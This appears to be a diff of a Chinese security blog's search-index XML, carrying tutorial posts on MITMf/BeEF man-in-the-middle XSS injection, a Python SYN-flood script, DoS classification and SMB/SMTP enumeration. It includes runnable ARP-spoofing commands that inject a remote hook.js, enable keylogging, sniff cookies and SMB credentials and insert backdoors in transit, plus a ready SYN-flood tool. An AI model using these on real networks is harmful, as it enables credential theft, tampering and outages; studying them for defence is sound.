@@ -78,11 +78,11 @@
       
         <tags>
             
+            <tag> nmap </tag>
+            
             <tag> 端口转发 </tag>
             
             <tag> sslh </tag>
-            
-            <tag> nmap </tag>
             
         </tags>
       
@@ -109,11 +109,11 @@
       
         <tags>
             
+            <tag> squid3 </tag>
+            
             <tag> proxytunnel </tag>
             
             <tag> HTTP隧道 </tag>
-            
-            <tag> squid3 </tag>
             
         </tags>
       
@@ -202,6 +202,8 @@
       
         <tags>
             
+            <tag> nc </tag>
+            
             <tag> http代理 </tag>
             
             <tag> DNS隧道 </tag>
@@ -211,8 +213,6 @@
             <tag> ncat </tag>
             
             <tag> iodine </tag>
-            
-            <tag> nc </tag>
             
             <tag> ssh </tag>
             
@@ -241,9 +241,9 @@
       
         <tags>
             
-            <tag> squid3 </tag>
-            
             <tag> dns2tcp </tag>
+            
+            <tag> squid3 </tag>
             
             <tag> http代理 </tag>
             
@@ -367,43 +367,6 @@
     
     
     <entry>
-      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 密码攻击 </category>
-          
-          <category> 嗅探欺骗 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> arpspoof </tag>
-            
-            <tag> dnsspoof </tag>
-            
-            <tag> Mitmf </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> beef </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Ettercap中间人攻击</title>
       <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
       <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
@@ -433,6 +396,43 @@
             <tag> PTH </tag>
             
             <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
+      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 密码攻击 </category>
+          
+          <category> 嗅探欺骗 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> dnsspoof </tag>
+            
+            <tag> Mitmf </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> beef </tag>
             
         </tags>
       
@@ -735,13 +735,13 @@
       
         <tags>
             
+            <tag> DoS攻击 </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
+            
             <tag> ARP欺骗 </tag>
             
             <tag> SSLsplit </tag>
-            
-            <tag> DOS攻击 </tag>
-            
-            <tag> 拒绝服务攻击 </tag>
             
         </tags>
       
@@ -923,6 +923,76 @@
     
     
     <entry>
+      <title>Syn-Flood拒绝服务攻击原理及IP地址欺骗</title>
+      <link href="/2013/10/23/DoS/Syn-Flood%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8AIP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/"/>
+      <url>/2013/10/23/DoS/Syn-Flood%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8AIP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="Syn-Flood"><a href="#Syn-Flood" class="headerlink" title="Syn Flood"></a><strong>Syn Flood</strong></h3></blockquote><p>常伴随IP欺骗</p><ul><li>真正的攻击目标</li></ul><p><strong>Scapy</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scapy</span><br><span class="line">i&#x3D;IP()</span><br><span class="line">i.dst&#x3D;1.1.1.1</span><br><span class="line">i.display()</span><br><span class="line">t&#x3D;TCP()</span><br><span class="line">sr1(i&#x2F;t,verbose&#x3D;1,timeout&#x3D;3)</span><br><span class="line">sr1(IP(dst&#x3D;1.1.1.1)&#x2F;TCP())</span><br></pre></td></tr></table></figure><h5 id="Python攻击脚本-Syn-flood-py"><a href="#Python攻击脚本-Syn-flood-py" class="headerlink" title="Python攻击脚本: Syn_flood.py"></a><strong>Python攻击脚本:</strong> <code>Syn_flood.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># .*. coding: utf-8 .*.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"用法: ./Syn_flood.py [IP] [端口] [线程数]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"举例: ./Syn_flood.py 1.1.1.1 80 20"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">target=str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prot=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">threads=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"正在执行 Syn Flood 攻击,按 Ctrl+C 停止攻击."</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synflood</span><span class="params">(target,port)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line">x=random.randint(<span class="number">0</span>,<span class="number">65535</span>)</span><br><span class="line">send(IP(dst=target)/TCP(dport=port,sport=x),verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,threads):</span><br><span class="line">thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>防火墙规则设置</strong></p><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP    #对攻击目标拒绝回RST包netstat -n | awk &apos;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&apos;    #查看TCP连接状态数据统计</code></pre><ul><li>Windows系统默认半连接数10个</li></ul><h4 id="TCP所有连接状态"><a href="#TCP所有连接状态" class="headerlink" title="TCP所有连接状态"></a><strong>TCP所有连接状态</strong></h4><table><thead><tr><th align="center">LISTEN</th><th align="center">S 服务器端口处于侦听状态,等待连接请求</th></tr></thead><tbody><tr><td align="center">SYN-SENT</td><td align="center">C 发起连接请求,等待对端口相应</td></tr><tr><td align="center">SYN-RECV</td><td align="center">S 已收到连接请求</td></tr><tr><td align="center">ESTABLISHED</td><td align="center">C/S三次握手成功,TCP连接已建立</td></tr><tr><td align="center">FIN-WAIT-1</td><td align="center">C/S等待对端相应中断请求确认,或对端中断请求</td></tr><tr><td align="center">FIN-WAIT-2</td><td align="center">C/S等待对端发送中断请求</td></tr><tr><td align="center">CLOSE-WAIT</td><td align="center">C/S等待本地 进程/用户 关闭连接</td></tr><tr><td align="center">CLOSING</td><td align="center">C/S等待对端响应连接中断确认</td></tr><tr><td align="center">LAST-ACK</td><td align="center">C/S等待对端响应之前的连接中断确认</td></tr><tr><td align="center">TIME-WAIT</td><td align="center">C/S等待足够时间长度确保对端收到连接中断确认(最大4分钟)</td></tr><tr><td align="center">CLOSED</td><td align="center">C/S无任何连接状态</td></tr></tbody></table><h4 id="IP地址欺骗"><a href="#IP地址欺骗" class="headerlink" title="IP地址欺骗"></a><strong>IP地址欺骗</strong></h4><ul><li><p>经常用于DoS攻击</p></li><li><p>根据IP头地址寻址<br>  伪造IP源地址</p></li><li><p>边界路由器过滤<br>  入站,出站</p></li><li><p>受害者可能是源,目的地址</p></li><li><p>绕过基于地址的验证</p></li><li><p>压力测试模拟多用户</p></li><li><p>上层协议(TCP序列号)</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 拒绝服务 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> DoS攻击 </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
+            
+            <tag> scapy </tag>
+            
+            <tag> TCP </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DoS拒绝服务攻击介绍及分类</title>
+      <link href="/2013/10/21/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/"/>
+      <url>/2013/10/21/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a><strong>拒绝服务</strong></h3></blockquote><p><strong>DoS不是DOS</strong></p><ul><li>利用程序漏洞或一对一资源耗尽的Denial of Service 拒绝服务</li></ul><p><strong>DDoS分布式拒绝服务</strong></p><ul><li>一对一的攻击完全拼各自的资源,效果差</li><li>多对一的攻击汇聚资源能力,重点在于量大,属于资源耗尽型</li></ul><p><strong>历史</strong></p><ul><li>以前:欠缺技术能力的无赖,我ping死你(最难缠的无赖)</li><li>现在:最强大最危险的攻击,攻击方式众多(专业化的要求勒索)</li><li>例如:电商网站被勒索,Bill gates僵尸程序</li><li>贩卖和租用肉鸡已经在为黑产中重要的一部分</li><li>最终的办法就是拼资源,投资抗D,或者乖乖交保护费</li></ul><h4 id="Anonymous匿名者"><a href="#Anonymous匿名者" class="headerlink" title="Anonymous匿名者"></a><strong>Anonymous匿名者</strong></h4><ul><li>世界最著名的黑客组织</li><li>组织结构宽松,人员来自世界各地</li><li>以DDoS攻击著称的无政府主义者</li><li>亦正亦邪,攻击恐怖组织也攻击政府宗教机构</li><li>近些年来涉足政治斗争</li><li>成员露面时均带有Guy Fawkes面具</li><li>最早的核心成员来自4chan图片社区</li><li>惯常雇佣外围黑客成员发动DDoS攻击</li></ul><p><strong>口号</strong><br>We are Anonymous, We are a Legion,<br>We do not forgive, We do not forget,<br>Expect us.</p><h4 id="DoS分类"><a href="#DoS分类" class="headerlink" title="DoS分类"></a><strong>DoS分类</strong></h4><h5 id="D网络"><a href="#D网络" class="headerlink" title="D网络"></a><strong>D网络</strong></h5><ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood, UDP Flood</li></ul><h5 id="D协议"><a href="#D协议" class="headerlink" title="D协议"></a><strong>D协议</strong></h5><ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如Syn Flood, Ping of Death, ARP, DNS, 802.11, SSL</li></ul><h5 id="D应用和系统"><a href="#D应用和系统" class="headerlink" title="D应用和系统"></a><strong>D应用和系统</strong></h5><ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用(CC)</li><li>通常表现为操作系统运行正常,网络流量不大,但服务停止相应</li><li>可以是一击毙命的,也可以是耗尽目标资源的</li></ul><p><em>以上分类并不严谨,不必太过执着于此</em></p><h4 id="为何会被DoS"><a href="#为何会被DoS" class="headerlink" title="为何会被DoS"></a><strong>为何会被DoS</strong></h4><p><strong>从攻击者到被害者</strong></p><ul><li>网络–&gt;FW–&gt;服务器OS–&gt;服务器应用</li></ul><p><strong>资源耗尽</strong></p><ul><li>网络:带宽</li><li>FW: 吞吐量,并发连接</li><li>服务器: CPU,内存,硬盘I/O</li><li>应用: 处理请求能力,对OS资源的使用权</li></ul><p><strong>程序漏洞攻击</strong></p><ul><li>缓冲区溢出</li><li>协议,程序逻辑漏洞</li></ul><p><strong>链路上任何一点都可能成为目标</strong></p><h4 id="通过3个指标分析拒绝服务攻击"><a href="#通过3个指标分析拒绝服务攻击" class="headerlink" title="通过3个指标分析拒绝服务攻击"></a><strong>通过3个指标分析拒绝服务攻击</strong></h4><p><strong>源</strong></p><ul><li>单一</li><li>众多</li></ul><p><strong>攻击手段类型</strong></p><ul><li>资源消耗型</li><li>漏洞利用型</li></ul><p><strong>攻击目标</strong></p><ul><li><p>资源消耗型:<br>  带宽上限<br>  设备性能上限<br>  协议性能上限<br>  应用性能上限<br>  系统性能上限</p></li><li><p>漏洞利用型:<br>  崩溃系统<br>  崩溃程序</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 拒绝服务 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> DoS攻击 </tag>
+            
+            <tag> DDoS攻击 </tag>
+            
+            <tag> CC </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
+            
+            <tag> 缓冲区溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Windows缓冲区溢出测试</title>
       <link href="/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
       <url>/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
@@ -941,9 +1011,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 缓冲区溢出 </tag>
+            
+            <tag> python </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1127,9 +1197,9 @@
       
         <tags>
             
-            <tag> 802.11 </tag>
-            
             <tag> 无线数据帧 </tag>
+            
+            <tag> 802.11 </tag>
             
         </tags>
       
@@ -1394,45 +1464,6 @@
     
     
     <entry>
-      <title>SMB扫描及SMTP扫描</title>
-      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
-      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
-      
-        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> nc </tag>
-            
-            <tag> nmap </tag>
-            
-            <tag> python </tag>
-            
-            <tag> SMB扫描 </tag>
-            
-            <tag> SMTP扫描 </tag>
-            
-            <tag> nbtscan </tag>
-            
-            <tag> enum4linux </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>WAF扫描识别及负载均衡识别</title>
       <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
       <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
@@ -1451,9 +1482,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
+            
+            <tag> nmap </tag>
             
             <tag> lbd </tag>
             
@@ -1462,6 +1493,45 @@
             <tag> wafw00f </tag>
             
             <tag> 负载均衡 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SMB扫描及SMTP扫描</title>
+      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
+      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
+      
